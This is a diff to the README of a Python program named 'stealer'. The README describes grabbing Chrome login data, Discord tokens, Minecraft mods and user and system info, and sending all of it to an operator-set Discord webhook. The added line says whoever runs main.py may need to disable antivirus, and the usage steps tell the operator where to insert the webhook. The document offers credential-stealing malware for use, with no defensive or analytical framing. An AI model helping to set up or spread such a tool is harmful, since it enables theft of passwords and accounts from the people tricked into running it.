@@ -1,6 +1,8 @@
 # stealer
 A program made in python. Grabs chrome login information, Minecraft mods (under 8mb), basic computer info and user info, discord tokens and sends to the discord webhook you set
 
+THIS MAY REQUIRE THE PERSON RUNNING main.py TO DISABLE ANTIVIRUS
+
 HOW TO USE: 
 
 1: set your discord webhook in line 20 in the file main.py
